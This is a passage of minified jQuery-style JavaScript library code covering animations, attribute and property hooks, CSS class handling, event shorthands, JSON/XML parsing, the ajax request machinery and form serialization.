    })), 1 === t.nodeType && ("height" in n || "width" in n) && (i.overflow = [s.overflow, s.overflowX, s.overflowY], u = e.css(t, "display"), v = "none" === u ? e.e$(t, "olddisplay") || F(t.nodeName) : u, "inline" === v && "none" === e.css(t, "float") && (r.inlineBlockNeedsLayout && "inline" !== F(t.nodeName) ? s.zoom = 1 : s.display = "inline-block")), i.overflow && (s.overflow = "hidden", r.shrinkWrapBlocks() || d.always(function () {
      s.overflow = i.overflow[0], s.overflowX = i.overflow[1], s.overflowY = i.overflow[2];
    }));
    for (o in n) if (f = n[o], zt.exec(f)) {
      if (delete n[o], m = m || "toggle" === f, f === (c ? "hide" : "show")) {
        if ("show" !== f || !a || void 0 === a[o]) continue;
        c = !0;
      }
      ;
      h[o] = a && a[o] || e.style(t, o);
    } else u = void 0;
    if (e.isEmptyObject(h)) "inline" === ("none" === u ? F(t.nodeName) : u) && (s.display = u);else {
      a ? "hidden" in a && (c = a.hidden) : a = e.e$(t, "fxshow", {}), m && (a.hidden = !c), c ? e(t).show() : d.done(function () {
        e(t).hide();
      }), d.done(function () {
        var n;
        e.n$(t, "fxshow");
        for (n in h) e.style(t, n, h[n]);
      });
      for (o in h) p = ut(c ? a[o] : 0, o, d), o in a || (a[o] = p.start, c && (p.end = p.start, p.start = "width" === o || "height" === o ? 1 : 0));
    }
  }
  ;
  function yt(t, n) {
    var r, o, a, i, s;
    for (r in t) if (o = e.camelCase(r), a = n[o], i = t[r], e.isArray(i) && (a = i[1], i = t[r] = i[0]), r !== o && (t[o] = i, delete t[r]), s = e.cssHooks[o], s && "expand" in s) {
      i = s.expand(i), delete t[o];
      for (r in i) r in t || (t[r] = i[r], n[r] = a);
    } else n[o] = a;
  }
  ;
  function Ye(t, n, r) {
    var u,
      a,
      s = 0,
      d = B.length,
      o = e.Deferred().always(function () {
        delete c.elem;
      }),
      c = function () {
        if (a) return !1;
        for (var l = E || lt(), e = Math.max(0, i.startTime + i.duration - l), u = e / i.duration || 0, n = 1 - u, r = 0, s = i.tweens.length; s > r; r++) i.tweens[r].run(n);
        return o.notifyWith(t, [i, n, e]), 1 > n && s ? e : (o.resolveWith(t, [i]), !1);
      },
      i = o.promise({
        elem: t,
        props: e.extend({}, n),
        opts: e.extend(!0, {
          specialEasing: {}
        }, r),
        originalProperties: n,
        originalOptions: r,
        startTime: E || lt(),
        duration: r.duration,
        tweens: [],
        createTween: function (n, r) {
          var o = e.Tween(t, i.opts, n, r, i.opts.specialEasing[n] || i.opts.easing);
          return i.tweens.push(o), o;
        },
        stop: function (e) {
          var n = 0,
            r = e ? i.tweens.length : 0;
          if (a) return this;
          for (a = !0; r > n; n++) i.tweens[n].run(1);
          return e ? o.resolveWith(t, [i, e]) : o.rejectWith(t, [i, e]), this;
        }
      }),
      l = i.props;
    for (yt(l, i.opts.specialEasing); d > s; s++) if (u = B[s].call(i, t, l, i.opts)) return u;
    return e.map(l, ut, i), e.isFunction(i.opts.start) && i.opts.start.call(t, i), e.fx.timer(e.extend(c, {
      elem: t,
      anim: i,
      queue: i.opts.queue
    })), i.progress(i.opts.progress).done(i.opts.done, i.opts.complete).fail(i.opts.fail).always(i.opts.always);
  }
  ;
  e.Animation = e.extend(Ye, {
    tweener: function (t, n) {
      e.isFunction(t) ? (n = t, t = ["*"]) : t = t.split(" ");
      for (var r, i = 0, o = t.length; o > i; i++) r = t[i], S[r] = S[r] || [], S[r].unshift(n);
    },
    prefilter: function (e, t) {
      t ? B.unshift(e) : B.push(e);
    }
  }), e.speed = function (t, n, r) {
    var i = t && "object" == typeof t ? e.extend({}, t) : {
      complete: r || !r && n || e.isFunction(t) && t,
      duration: t,
      easing: r && n || n && !e.isFunction(n) && n
    };
    return i.duration = e.fx.off ? 0 : "number" == typeof i.duration ? i.duration : i.duration in e.fx.speeds ? e.fx.speeds[i.duration] : e.fx.speeds.t$, (null == i.queue || i.queue === !0) && (i.queue = "fx"), i.old = i.complete, i.complete = function () {
      e.isFunction(i.old) && i.old.call(this), i.queue && e.dequeue(this, i.queue);
    }, i;
  }, e.fn.extend({
    fadeTo: function (e, t, n, r) {
      return this.filter(D).css("opacity", 0).show().end().animate({
        opacity: t
      }, e, n, r);
    },
    animate: function (t, n, r, i) {
      var s = e.isEmptyObject(t),
        a = e.speed(n, r, i),
        o = function () {
          var n = Ye(this, e.extend({}, t), a);
          (s || e.e$(this, "finish")) && n.stop(!0);
        };
      return o.finish = o, s || a.queue === !1 ? this.each(o) : this.queue(a.queue, o);
    },
    stop: function (t, n, r) {
      var i = function (e) {
        var t = e.stop;
        delete e.stop, t(r);
      };
      return "string" != typeof t && (r = n, n = t, t = void 0), n && t !== !1 && this.queue(t || "fx", []), this.each(function () {
        var s = !0,
          n = null != t && t + "queueHooks",
          a = e.timers,
          o = e.e$(this);
        if (n) o[n] && o[n].stop && i(o[n]);else for (n in o) o[n] && o[n].stop && Wt.test(n) && i(o[n]);
        for (n = a.length; n--;) a[n].elem !== this || null != t && a[n].queue !== t || (a[n].anim.stop(r), s = !1, a.splice(n, 1));
        (s || !r) && e.dequeue(this, t);
      });
    },
    finish: function (t) {
      return t !== !1 && (t = t || "fx"), this.each(function () {
        var n,
          o = e.e$(this),
          r = o[t + "queue"],
          a = o[t + "queueHooks"],
          i = e.timers,
          s = r ? r.length : 0;
        for (o.finish = !0, e.queue(this, t, []), a && a.stop && a.stop.call(this, !0), n = i.length; n--;) i[n].elem === this && i[n].queue === t && (i[n].anim.stop(!0), i.splice(n, 1));
        for (n = 0; s > n; n++) r[n] && r[n].finish && r[n].finish.call(this);
        delete o.finish;
      });
    }
  }), e.each(["toggle", "show", "hide"], function (t, n) {
    var r = e.fn[n];
    e.fn[n] = function (e, t, i) {
      return null == e || "boolean" == typeof e ? r.apply(this, arguments) : this.animate(P(n, !0), e, t, i);
    };
  }), e.each({
    slideDown: P("show"),
    slideUp: P("hide"),
    slideToggle: P("toggle"),
    fadeIn: {
      opacity: "show"
    },
    fadeOut: {
      opacity: "hide"
    },
    fadeToggle: {
      opacity: "toggle"
    }
  }, function (t, n) {
    e.fn[t] = function (e, t, r) {
      return this.animate(n, e, t, r);
    };
  }), e.timers = [], e.fx.tick = function () {
    var r,
      t = e.timers,
      n = 0;
    for (E = e.now(); n < t.length; n++) r = t[n], r() || t[n] !== r || t.splice(n--, 1);
    t.length || e.fx.stop(), E = void 0;
  }, e.fx.timer = function (t) {
    e.timers.push(t), t() ? e.fx.start() : e.timers.pop();
  }, e.fx.interval = 13, e.fx.start = function () {
    R || (R = setInterval(e.fx.tick, e.fx.interval));
  }, e.fx.stop = function () {
    clearInterval(R), R = null;
  }, e.fx.speeds = {
    slow: 600,
    fast: 200,
    t$: 400
  }, e.fn.delay = function (t, n) {
    return t = e.fx ? e.fx.speeds[t] || t : t, n = n || "fx", this.queue(n, function (e, n) {
      var r = setTimeout(e, t);
      n.stop = function () {
        clearTimeout(r);
      };
    });
  }, function () {
    var e, t, o, n, a;
    t = i.createElement("div"), t.setAttribute("className", "t"), t.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", n = t.getElementsByTagName("a")[0], o = i.createElement("select"), a = o.appendChild(i.createElement("option")), e = t.getElementsByTagName("input")[0], n.style.cssText = "top:1px", r.getSetAttribute = "t" !== t.className, r.style = /top/.test(n.getAttribute("style")), r.hrefNormalized = "/a" === n.getAttribute("href"), r.checkOn = !!e.value, r.optSelected = a.selected, r.enctype = !!i.createElement("form").enctype, o.disabled = !0, r.optDisabled = !a.disabled, e = i.createElement("input"), e.setAttribute("value", ""), r.input = "" === e.getAttribute("value"), e.value = "t", e.setAttribute("type", "radio"), r.radioValue = "t" === e.value;
  }();
  var Tt = /\r/g;
  e.fn.extend({
    val: function (t) {
      var n,
        r,
        o,
        i = this[0];
      {
        if (arguments.length) return o = e.isFunction(t), this.each(function (r) {
          var i;
          1 === this.nodeType && (i = o ? t.call(this, r, e(this).val()) : t, null == i ? i = "" : "number" == typeof i ? i += "" : e.isArray(i) && (i = e.map(i, function (e) {
            return null == e ? "" : e + "";
          })), n = e.valHooks[this.type] || e.valHooks[this.nodeName.toLowerCase()], n && "set" in n && void 0 !== n.set(this, i, "value") || (this.value = i));
        });
        if (i) return n = e.valHooks[i.type] || e.valHooks[i.nodeName.toLowerCase()], n && "get" in n && void 0 !== (r = n.get(i, "value")) ? r : (r = i.value, "string" == typeof r ? r.replace(Tt, "") : null == r ? "" : r);
      }
    }
  }), e.extend({
    valHooks: {
      option: {
        get: function (t) {
          var n = e.find.attr(t, "value");
          return null != n ? n : e.trim(e.text(t));
        }
      },
      select: {
        get: function (t) {
          for (var s, n, l = t.options, i = t.selectedIndex, o = "select-one" === t.type || 0 > i, u = o ? null : [], c = o ? i + 1 : l.length, a = 0 > i ? c : o ? i : 0; c > a; a++) if (n = l[a], !(!n.selected && a !== i || (r.optDisabled ? n.disabled : null !== n.getAttribute("disabled")) || n.parentNode.disabled && e.nodeName(n.parentNode, "optgroup"))) {
            if (s = e(n).val(), o) return s;
            u.push(s);
          }
          ;
          return u;
        },
        set: function (t, n) {
          var a,
            i,
            o = t.options,
            l = e.makeArray(n),
            s = o.length;
          while (s--) if (i = o[s], e.inArray(e.valHooks.option.get(i), l) >= 0) try {
            i.selected = a = !0;
          } catch (r) {
            i.scrollHeight;
          } else i.selected = !1;
          return a || (t.selectedIndex = -1), o;
        }
      }
    }
  }), e.each(["radio", "checkbox"], function () {
    e.valHooks[this] = {
      set: function (t, n) {
        return e.isArray(n) ? t.checked = e.inArray(e(t).val(), n) >= 0 : void 0;
      }
    }, r.checkOn || (e.valHooks[this].get = function (e) {
      return null === e.getAttribute("value") ? "on" : e.value;
    });
  });
  var C,
    Re,
    f = e.expr.attrHandle,
    oe = /^(?:checked|selected)$/i,
    b = r.getSetAttribute,
    z = r.input;
  e.fn.extend({
    attr: function (t, n) {
      return y(this, e.attr, t, n, arguments.length > 1);
    },
    removeAttr: function (t) {
      return this.each(function () {
        e.removeAttr(this, t);
      });
    }
  }), e.extend({
    attr: function (t, n, r) {
      var i,
        o,
        a = t.nodeType;
      if (t && 3 !== a && 8 !== a && 2 !== a) return typeof t.getAttribute === u ? e.prop(t, n, r) : (1 === a && e.isXMLDoc(t) || (n = n.toLowerCase(), i = e.attrHooks[n] || (e.expr.match.bool.test(n) ? Re : C)), void 0 === r ? i && "get" in i && null !== (o = i.get(t, n)) ? o : (o = e.find.attr(t, n), null == o ? void 0 : o) : null !== r ? i && "set" in i && void 0 !== (o = i.set(t, r, n)) ? o : (t.setAttribute(n, r + ""), r) : void e.removeAttr(t, n));
    },
    removeAttr: function (t, n) {
      var r,
        i,
        a = 0,
        o = n && n.match(c);
      if (o && 1 === t.nodeType) while (r = o[a++]) i = e.propFix[r] || r, e.expr.match.bool.test(r) ? z && b || !oe.test(r) ? t[i] = !1 : t[e.camelCase("default-" + r)] = t[i] = !1 : e.attr(t, r, ""), t.removeAttribute(b ? r : i);
    },
    attrHooks: {
      type: {
        set: function (t, n) {
          if (!r.radioValue && "radio" === n && e.nodeName(t, "input")) {
            var i = t.value;
            return t.setAttribute("type", n), i && (t.value = i), n;
          }
        }
      }
    }
  }), Re = {
    set: function (t, n, r) {
      return n === !1 ? e.removeAttr(t, r) : z && b || !oe.test(r) ? t.setAttribute(!b && e.propFix[r] || r, r) : t[e.camelCase("default-" + r)] = t[r] = !0, r;
    }
  }, e.each(e.expr.match.bool.source.match(/\w+/g), function (t, n) {
    var r = f[n] || e.find.attr;
    f[n] = z && b || !oe.test(n) ? function (e, t, n) {
      var i, o;
      return n || (o = f[t], f[t] = i, i = null != r(e, t, n) ? t.toLowerCase() : null, f[t] = o), i;
    } : function (t, n, r) {
      return r ? void 0 : t[e.camelCase("default-" + n)] ? n.toLowerCase() : null;
    };
  }), z && b || (e.attrHooks.value = {
    set: function (t, n, r) {
      return e.nodeName(t, "input") ? void (t.defaultValue = n) : C && C.set(t, n, r);
    }
  }), b || (C = {
    set: function (e, t, n) {
      var r = e.getAttributeNode(n);
      return r || e.setAttributeNode(r = e.ownerDocument.createAttribute(n)), r.value = t += "", "value" === n || t === e.getAttribute(n) ? t : void 0;
    }
  }, f.id = f.name = f.coords = function (e, t, n) {
    var r;
    return n ? void 0 : (r = e.getAttributeNode(t)) && "" !== r.value ? r.value : null;
  }, e.valHooks.button = {
    get: function (e, t) {
      var n = e.getAttributeNode(t);
      return n && n.specified ? n.value : void 0;
    },
    set: C.set
  }, e.attrHooks.contenteditable = {
    set: function (e, t, n) {
      C.set(e, "" === t ? !1 : t, n);
    }
  }, e.each(["width", "height"], function (t, n) {
    e.attrHooks[n] = {
      set: function (e, t) {
        return "" === t ? (e.setAttribute(n, "auto"), t) : void 0;
      }
    };
  })), r.style || (e.attrHooks.style = {
    get: function (e) {
      return e.style.cssText || void 0;
    },
    set: function (e, t) {
      return e.style.cssText = t + "";
    }
  });
  var Ht = /^(?:input|select|textarea|button|object)$/i,
    Mt = /^(?:a|area)$/i;
  e.fn.extend({
    prop: function (t, n) {
      return y(this, e.prop, t, n, arguments.length > 1);
    },
    removeProp: function (t) {
      return t = e.propFix[t] || t, this.each(function () {
        try {
          this[t] = void 0, delete this[t];
        } catch (e) {}
      });
    }
  }), e.extend({
    propFix: {
      "for": "htmlFor",
      "class": "className"
    },
    prop: function (t, n, r) {
      var o,
        i,
        s,
        a = t.nodeType;
      if (t && 3 !== a && 8 !== a && 2 !== a) return s = 1 !== a || !e.isXMLDoc(t), s && (n = e.propFix[n] || n, i = e.propHooks[n]), void 0 !== r ? i && "set" in i && void 0 !== (o = i.set(t, r, n)) ? o : t[n] = r : i && "get" in i && null !== (o = i.get(t, n)) ? o : t[n];
    },
    propHooks: {
      tabIndex: {
        get: function (t) {
          var n = e.find.attr(t, "tabindex");
          return n ? parseInt(n, 10) : Ht.test(t.nodeName) || Mt.test(t.nodeName) && t.href ? 0 : -1;
        }
      }
    }
  }), r.hrefNormalized || e.each(["href", "src"], function (t, n) {
    e.propHooks[n] = {
      get: function (e) {
        return e.getAttribute(n, 4);
      }
    };
  }), r.optSelected || (e.propHooks.selected = {
    get: function (e) {
      var t = e.parentNode;
      return t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex), null;
    }
  }), e.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () {
    e.propFix[this.toLowerCase()] = this;
  }), r.enctype || (e.propFix.enctype = "encoding");
  var Q = /[\t\r\n\f]/g;
  e.fn.extend({
    addClass: function (t) {
      var s,
        n,
        r,
        i,
        l,
        o,
        a = 0,
        u = this.length,
        d = "string" == typeof t && t;
      if (e.isFunction(t)) return this.each(function (n) {
        e(this).addClass(t.call(this, n, this.className));
      });
      if (d) for (s = (t || "").match(c) || []; u > a; a++) if (n = this[a], r = 1 === n.nodeType && (n.className ? (" " + n.className + " ").replace(Q, " ") : " ")) {
        l = 0;
        while (i = s[l++]) r.indexOf(" " + i + " ") < 0 && (r += i + " ");
        o = e.trim(r), n.className !== o && (n.className = o);
      }
      ;
      return this;
    },
    removeClass: function (t) {
      var s,
        n,
        r,
        i,
        l,
        o,
        a = 0,
        u = this.length,
        d = 0 === arguments.length || "string" == typeof t && t;
      if (e.isFunction(t)) return this.each(function (n) {
        e(this).removeClass(t.call(this, n, this.className));
      });
      if (d) for (s = (t || "").match(c) || []; u > a; a++) if (n = this[a], r = 1 === n.nodeType && (n.className ? (" " + n.className + " ").replace(Q, " ") : "")) {
        l = 0;
        while (i = s[l++]) while (r.indexOf(" " + i + " ") >= 0) r = r.replace(" " + i + " ", " ");
        o = t ? e.trim(r) : "", n.className !== o && (n.className = o);
      }
      ;
      return this;
    },
    toggleClass: function (t, n) {
      var r = typeof t;
      return "boolean" == typeof n && "string" === r ? n ? this.addClass(t) : this.removeClass(t) : this.each(e.isFunction(t) ? function (r) {
        e(this).toggleClass(t.call(this, r, this.className, n), n);
      } : function () {
        if ("string" === r) {
          var n,
            o = 0,
            i = e(this),
            a = t.match(c) || [];
          while (n = a[o++]) i.hasClass(n) ? i.removeClass(n) : i.addClass(n);
        } else (r === u || "boolean" === r) && (this.className && e.e$(this, "__className__", this.className), this.className = this.className || t === !1 ? "" : e.e$(this, "__className__") || "");
      });
    },
    hasClass: function (e) {
      for (var n = " " + e + " ", t = 0, r = this.length; r > t; t++) if (1 === this[t].nodeType && (" " + this[t].className + " ").replace(Q, " ").indexOf(n) >= 0) return !0;
      return !1;
    }
  }), e.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function (t, n) {
    e.fn[n] = function (e, t) {
      return arguments.length > 0 ? this.on(n, null, e, t) : this.trigger(n);
    };
  }), e.fn.extend({
    hover: function (e, t) {
      return this.mouseenter(e).mouseleave(t || e);
    },
    bind: function (e, t, n) {
      return this.on(e, null, t, n);
    },
    unbind: function (e, t) {
      return this.off(e, null, t);
    },
    delegate: function (e, t, n, r) {
      return this.on(t, e, n, r);
    },
    undelegate: function (e, t, n) {
      return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n);
    }
  });
  var X = e.now(),
    G = /\?/,
    Lt = /(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;
  e.parseJSON = function (n) {
    if (t.JSON && t.JSON.parse) return t.JSON.parse(n + "");
    var o,
      r = null,
      i = e.trim(n + "");
    return i && !e.trim(i.replace(Lt, function (e, t, n, i) {
      return o && t && (r = 0), 0 === r ? e : (o = n || t, r += !i - !n, "");
    })) ? Function("return " + i)() : e.error("Invalid JSON: " + n);
  }, e.parseXML = function (n) {
    var i, o;
    if (!n || "string" != typeof n) return null;
    try {
      t.DOMParser ? (o = new DOMParser(), i = o.parseFromString(n, "text/xml")) : (i = new ActiveXObject("Microsoft.XMLDOM"), i.async = "false", i.loadXML(n));
    } catch (r) {
      i = void 0;
    }
    ;
    return i && i.documentElement && !i.getElementsByTagName("parsererror").length || e.error("Invalid XML: " + n), i;
  };
  var x,
    d,
    en = /#.*$/,
    Ee = /([?&])_=[^&]*/,
    tn = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm,
    rn = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
    on = /^(?:GET|HEAD)$/,
    ln = /^\/\//,
    pe = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,
    de = {},
    te = {},
    Oe = "*/".concat("*");
  try {
    d = location.href;
  } catch (o) {
    d = i.createElement("a"), d.href = "", d = d.href;
  }
  ;
  x = pe.exec(d.toLowerCase()) || [];
  function Ue(t) {
    return function (n, r) {
      "string" != typeof n && (r = n, n = "*");
      var i,
        o = 0,
        a = n.toLowerCase().match(c) || [];
      if (e.isFunction(r)) while (i = a[o++]) "+" === i.charAt(0) ? (i = i.slice(1) || "*", (t[i] = t[i] || []).unshift(r)) : (t[i] = t[i] || []).push(r);
    };
  }
  ;
  function Ve(t, n, r, i) {
    var o = {},
      s = t === te;
    function a(l) {
      var u;
      return o[l] = !0, e.each(t[l] || [], function (e, t) {
        var l = t(n, r, i);
        return "string" != typeof l || s || o[l] ? s ? !(u = l) : void 0 : (n.dataTypes.unshift(l), a(l), !1);
      }), u;
    }
    ;
    return a(n.dataTypes[0]) || !o["*"] && a("*");
  }
  ;
  function V(t, n) {
    var i,
      r,
      o = e.ajaxSettings.flatOptions || {};
    for (r in n) void 0 !== n[r] && ((o[r] ? t : i || (i = {}))[r] = n[r]);
    return i && e.extend(!0, t, i), t;
  }
  ;
  function mt(e, t, n) {
    var s,
      a,
      i,
      o,
      l = e.contents,
      r = e.dataTypes;
    while ("*" === r[0]) r.shift(), void 0 === a && (a = e.mimeType || t.getResponseHeader("Content-Type"));
    if (a) for (o in l) if (l[o] && l[o].test(a)) {
      r.unshift(o);
      break;
    }
    ;
    if (r[0] in n) i = r[0];else {
      for (o in n) {
        if (!r[0] || e.converters[o + " " + r[0]]) {
          i = o;
          break;
        }
        ;
        s || (s = o);
      }
      ;
      i = i || s;
    }
    ;
    return i ? (i !== r[0] && r.unshift(i), n[i]) : void 0;
  }
  ;
  function vt(e, t, n, r) {
    var c,
      o,
      a,
      u,
      s,
      l = {},
      d = e.dataTypes.slice();
    if (d[1]) for (a in e.converters) l[a.toLowerCase()] = e.converters[a];
    o = d.shift();
    while (o) if (e.responseFields[o] && (n[e.responseFields[o]] = t), !s && r && e.dataFilter && (t = e.dataFilter(t, e.dataType)), s = o, o = d.shift()) if ("*" === o) o = s;else if ("*" !== s && s !== o) {
      if (a = l[s + " " + o] || l["* " + o], !a) for (c in l) if (u = c.split(" "), u[1] === o && (a = l[s + " " + u[0]] || l["* " + u[0]])) {
        a === !0 ? a = l[c] : l[c] !== !0 && (o = u[0], d.unshift(u[1]));
        break;
      }
      ;
      if (a !== !0) if (a && e["throws"]) t = a(t);else try {
        t = a(t);
      } catch (i) {
        return {
          state: "parsererror",
          error: a ? i : "No conversion from " + s + " to " + o
        };
      }
    }
    ;
    return {
      state: "success",
      data: t
    };
  }
  ;
  e.extend({
    active: 0,
    lastModified: {},
    etag: {},
    ajaxSettings: {
      url: d,
      type: "GET",
      isLocal: rn.test(x[1]),
      global: !0,
      processData: !0,
      async: !0,
      contentType: "application/x-www-form-urlencoded; charset=UTF-8",
      accepts: {
        "*": Oe,
        text: "text/plain",
        html: "text/html",
        xml: "application/xml, text/xml",
        json: "application/json, text/javascript"
      },
      contents: {
        xml: /xml/,
        html: /html/,
        json: /json/
      },
      responseFields: {
        xml: "responseXML",
        text: "responseText",
        json: "responseJSON"
      },
      converters: {
        "* text": String,
        "text html": !0,
        "text json": e.parseJSON,
        "text xml": e.parseXML
      },
      flatOptions: {
        url: !0,
        context: !0
      }
    },
    ajaxSetup: function (t, n) {
      return n ? V(V(t, e.ajaxSettings), n) : V(e.ajaxSettings, t);
    },
    ajaxPrefilter: Ue(de),
    ajaxTransport: Ue(te),
    ajax: function (t, n) {
      "object" == typeof t && (n = t, t = void 0), n = n || {};
      var f,
        u,
        a,
        y,
        b,
        p,
        h,
        g,
        r = e.ajaxSetup({}, n),
        l = r.context || r,
        T = r.context && (l.nodeType || l.jquery) ? e(l) : e.event,
        w = e.Deferred(),
        k = e.Callbacks("once memory"),
        m = r.statusCode || {},
        C = {},
        N = {},
        s = 0,
        E = "canceled",
        i = {
          readyState: 0,
          getResponseHeader: function (e) {
            var t;
            if (2 === s) {
              if (!g) {
                g = {};
                while (t = tn.exec(y)) g[t[1].toLowerCase()] = t[2];
              }
              ;
              t = g[e.toLowerCase()];
            }
            ;
            return null == t ? null : t;
          },
          getAllResponseHeaders: function () {
            return 2 === s ? y : null;
          },
          setRequestHeader: function (e, t) {
            var n = e.toLowerCase();
            return s || (e = N[n] = N[n] || e, C[e] = t), this;
          },
          overrideMimeType: function (e) {
            return s || (r.mimeType = e), this;
          },
          statusCode: function (e) {
            var t;
            if (e) if (2 > s) for (t in e) m[t] = [m[t], e[t]];else i.always(e[i.status]);
            return this;
          },
          abort: function (e) {
            var t = e || E;
            return h && h.abort(t), v(0, t), this;
          }
        };
      if (w.promise(i).complete = k.add, i.success = i.done, i.error = i.fail, r.url = ((t || r.url || d) + "").replace(en, "").replace(ln, x[1] + "//"), r.type = n.method || n.type || r.method || r.type, r.dataTypes = e.trim(r.dataType || "*").toLowerCase().match(c) || [""], null == r.crossDomain && (f = pe.exec(r.url.toLowerCase()), r.crossDomain = !(!f || f[1] === x[1] && f[2] === x[2] && (f[3] || ("http:" === f[1] ? "80" : "443")) === (x[3] || ("http:" === x[1] ? "80" : "443")))), r.data && r.processData && "string" != typeof r.data && (r.data = e.param(r.data, r.traditional)), Ve(de, r, n, i), 2 === s) return i;
      p = r.global, p && 0 === e.active++ && e.event.trigger("ajaxStart"), r.type = r.type.toUpperCase(), r.hasContent = !on.test(r.type), a = r.url, r.hasContent || (r.data && (a = r.url += (G.test(a) ? "&" : "?") + r.data, delete r.data), r.cache === !1 && (r.url = Ee.test(a) ? a.replace(Ee, "$1_=" + X++) : a + (G.test(a) ? "&" : "?") + "_=" + X++)), r.ifModified && (e.lastModified[a] && i.setRequestHeader("If-Modified-Since", e.lastModified[a]), e.etag[a] && i.setRequestHeader("If-None-Match", e.etag[a])), (r.data && r.hasContent && r.contentType !== !1 || n.contentType) && i.setRequestHeader("Content-Type", r.contentType), i.setRequestHeader("Accept", r.dataTypes[0] && r.accepts[r.dataTypes[0]] ? r.accepts[r.dataTypes[0]] + ("*" !== r.dataTypes[0] ? ", " + Oe + "; q=0.01" : "") : r.accepts["*"]);
      for (u in r.headers) i.setRequestHeader(u, r.headers[u]);
      if (r.beforeSend && (r.beforeSend.call(l, i, r) === !1 || 2 === s)) return i.abort();
      E = "abort";
      for (u in {
        success: 1,
        error: 1,
        complete: 1
      }) i[u](r[u]);
      if (h = Ve(te, r, n, i)) {
        i.readyState = 1, p && T.trigger("ajaxSend", [i, r]), r.async && r.timeout > 0 && (b = setTimeout(function () {
          i.abort("timeout");
        }, r.timeout));
        try {
          s = 1, h.send(C, v);
        } catch (o) {
          if (!(2 > s)) throw o;
          v(-1, o);
        }
      } else v(-1, "No Transport");
      function v(t, n, o, u) {
        var d,
          x,
          v,
          f,
          g,
          c = n;
        2 !== s && (s = 2, b && clearTimeout(b), h = void 0, y = u || "", i.readyState = t > 0 ? 4 : 0, d = t >= 200 && 300 > t || 304 === t, o && (f = mt(r, i, o)), f = vt(r, f, i, d), d ? (r.ifModified && (g = i.getResponseHeader("Last-Modified"), g && (e.lastModified[a] = g), g = i.getResponseHeader("etag"), g && (e.etag[a] = g)), 204 === t || "HEAD" === r.type ? c = "nocontent" : 304 === t ? c = "notmodified" : (c = f.state, x = f.data, v = f.error, d = !v)) : (v = c, (t || !c) && (c = "error", 0 > t && (t = 0))), i.status = t, i.statusText = (n || c) + "", d ? w.resolveWith(l, [x, c, i]) : w.rejectWith(l, [i, c, v]), i.statusCode(m), m = void 0, p && T.trigger(d ? "ajaxSuccess" : "ajaxError", [i, r, d ? x : v]), k.fireWith(l, [i, c]), p && (T.trigger("ajaxComplete", [i, r]), --e.active || e.event.trigger("ajaxStop")));
      }
      ;
      return i;
    },
    getJSON: function (t, n, r) {
      return e.get(t, n, r, "json");
    },
    getScript: function (t, n) {
      return e.get(t, void 0, n, "script");
    }
  }), e.each(["get", "post"], function (t, n) {
    e[n] = function (t, r, i, o) {
      return e.isFunction(r) && (o = o || i, i = r, r = void 0), e.ajax({
        url: t,
        type: n,
        dataType: o,
        data: r,
        success: i
      });
    };
  }), e.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function (t, n) {
    e.fn[n] = function (e) {
      return this.on(n, e);
    };
  }), e.a$ = function (t) {
    return e.ajax({
      url: t,
      type: "GET",
      dataType: "script",
      async: !1,
      global: !1,
      "throws": !0
    });
  }, e.fn.extend({
    wrapAll: function (t) {
      if (e.isFunction(t)) return this.each(function (n) {
        e(this).wrapAll(t.call(this, n));
      });
      if (this[0]) {
        var n = e(t, this[0].ownerDocument).eq(0).clone(!0);
        this[0].parentNode && n.insertBefore(this[0]), n.map(function () {
          var e = this;
          while (e.firstChild && 1 === e.firstChild.nodeType) e = e.firstChild;
          return e;
        }).append(this);
      }
      ;
      return this;
    },
    wrapInner: function (t) {
      return this.each(e.isFunction(t) ? function (n) {
        e(this).wrapInner(t.call(this, n));
      } : function () {
        var n = e(this),
          r = n.contents();
        r.length ? r.wrapAll(t) : n.append(t);
      });
    },
    wrap: function (t) {
      var n = e.isFunction(t);
      return this.each(function (r) {
        e(this).wrapAll(n ? t.call(this, r) : t);
      });
    },
    unwrap: function () {
      return this.parent().each(function () {
        e.nodeName(this, "body") || e(this).replaceWith(this.childNodes);
      }).end();
    }
  }), e.expr.filters.hidden = function (t) {
    return t.offsetWidth <= 0 && t.offsetHeight <= 0 || !r.reliableHiddenOffsets() && "none" === (t.style && t.style.display || e.css(t, "display"));
  }, e.expr.filters.visible = function (t) {
    return !e.expr.filters.hidden(t);
  };
  var pt = /%20/g,
    ft = /\[\]$/,
    je = /\r?\n/g,
    gt = /^(?:submit|button|image|reset|file)$/i,
    Ct = /^(?:input|select|textarea|keygen)/i;
  function ne(t, n, r, i) {
    var o;
    if (e.isArray(n)) e.each(n, function (e, n) {
      r || ft.test(t) ? i(t, n) : ne(t + "[" + ("object" == typeof n ? e : "") + "]", n, r, i);
    });else if (r || "object" !== e.type(n)) i(t, n);else for (o in n) ne(t + "[" + o + "]", n[o], r, i);
  }
  ;
  e.param = function (t, n) {
    var r,
      i = [],
      o = function (t, n) {
        n = e.isFunction(n) ? n() : null == n ? "" : n, i[i.length] = encodeURIComponent(t) + "=" + encodeURIComponent(n);
      };
    if (void 0 === n && (n = e.ajaxSettings && e.ajaxSettings.traditional), e.isArray(t) || t.jquery && !e.isPlainObject(t)) e.each(t, function () {
      o(this.name, this.value);
    });else for (r in t) ne(r, t[r], n, o);
    return i.join("&").replace(pt, "+");
  }, e.fn.extend({
    serialize: function () {
      return e.param(this.serializeArray());
    },
    serializeArray: function () {
      return this.map(function () {
        var t = e.prop(this, "elements");
        return t ? e.makeArray(t) : this;
      }).filter(function () {
        var t = this.type;
        return this.name && !e(this).is(":disabled") && Ct.test(this.nodeName) && !gt.test(t) && (this.checked || !se.test(t));
      }).map(function (t, n) {
        var r = e(this).val();
        return null == r ? null : e.isArray(r) ? e.map(r, function (e) {
          return {
            name: n.name,
